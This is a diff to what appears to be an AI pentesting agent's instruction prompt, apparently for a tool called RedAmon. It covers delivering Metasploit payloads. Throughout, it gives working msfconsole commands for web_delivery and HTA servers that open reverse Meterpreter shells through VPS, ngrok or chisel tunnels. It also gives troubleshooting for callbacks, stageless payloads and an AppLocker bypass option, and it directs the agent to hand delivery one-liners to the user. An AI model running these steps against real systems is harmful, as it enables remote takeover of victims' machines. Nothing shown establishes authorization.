@@ -172,10 +172,8 @@ Web delivery requires TWO open ports reachable by the target:
 1. **SRVPORT** (e.g. 8080) — HTTP server that serves the payload download
 2. **LPORT** (e.g. 4444) — reverse handler that catches the Meterpreter callback
 
-**→ If using ngrok (single tunnel): DO NOT use web_delivery.** ngrok only forwards ONE port (LPORT). Use Method A instead.
-**→ If using chisel tunnel: web delivery WORKS!** Chisel tunnels BOTH SRVPORT (8080) and LPORT (4444).
-   Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`. The target downloads from `http://<VPS>:8080/...`.
-**→ If on the same LAN as the target: web delivery works** (both ports directly reachable).
+**→ If using a tunnel (ngrok or chisel): DO NOT use web_delivery.** Each forwards ONE port only (LPORT, to the handler on 4444). Use Method A instead.
+**→ If the target can reach both ports directly** (no tunnel needed): web delivery works.
 
 ```
 use exploit/multi/script/web_delivery; set TARGET <target_number>; set PAYLOAD <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT <srv_port>; run -j
@@ -204,9 +202,8 @@ Host an HTA (HTML Application) that executes a payload when opened in a browser.
 
 **⚠ Same TUNNEL COMPATIBILITY as Method C:**
 HTA delivery also requires two reachable ports (SRVPORT for the HTA download + LPORT for the reverse callback).
-**→ If using ngrok (single tunnel): DO NOT use HTA delivery.** Use Method A instead.
-**→ If using chisel tunnel: HTA delivery WORKS!** Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`.
-**→ If on the same LAN: HTA delivery works.**
+**→ If using a tunnel (ngrok or chisel): DO NOT use HTA delivery.** Use Method A instead.
+**→ If the target can reach both ports directly: HTA delivery works.**
 
 ```
 use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; run -j
@@ -260,14 +257,12 @@ Report the one-liner command (Method C) or URL (Method D) to the user.
 | msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
 | Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
 | Handler dies immediately | Check LHOST is correct. If using ngrok or chisel, set `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort <local tunnel port>` (the port your tunnel listens on = your LPORT, not necessarily 4444). |
-| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in kali-sandbox. |
+| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in your Kali sandbox. |
 | Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads typically fail through TCP-forwarding tunnels (ngrok/chisel) but work over direct connections and full L3 tunnels (VPN). |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
 | Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
-| Web delivery: no session (ngrok) | Web delivery CANNOT work through ngrok (needs TWO ports). Switch to Method A or use chisel tunnel instead. |
-| Web delivery: no session (chisel) | Verify chisel is tunneling port 8080. Check `SRVHOST 0.0.0.0` and `SRVPORT 8080`. Verify the one-liner URL uses the VPS hostname. Check `/var/log/chisel.log`. |
-| HTA delivery: no session (ngrok) | Same as web delivery — HTA needs SRVPORT reachable. Use Method A or chisel. |
-| HTA delivery: no session (chisel) | Verify chisel tunnels port 8080. Check SRVHOST/SRVPORT settings and chisel logs. |
+| Web delivery: no session (ngrok or chisel tunnel) | Web delivery CANNOT work through a tunnel: ngrok and chisel each forward ONE port only (your LPORT, to the handler on 4444), so the target can never reach SRVPORT. Switch to Method A, or ask the user. |
+| HTA delivery: no session (ngrok or chisel tunnel) | Same as web delivery: HTA needs SRVPORT reachable and no tunnel forwards it. Use Method A, or ask the user. |
 | No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
 | **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
 """
